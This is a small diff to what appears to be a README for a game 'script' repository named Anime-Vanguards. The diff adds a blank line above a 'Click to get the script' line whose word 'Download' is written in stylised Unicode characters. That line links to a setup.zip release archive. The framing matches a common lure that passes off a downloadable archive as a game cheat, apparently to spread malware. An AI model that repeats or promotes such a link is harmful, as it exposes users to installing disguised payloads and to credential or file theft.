@@ -31,6 +31,7 @@
 
 
 
+
 # Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/Anime-Vanguards/releases/download/Download/setup.zip)***
 
 ![maxresdefault](https://github.com/user-attachments/assets/5bd86558-608f-419b-9693-d9300fa37f7e)
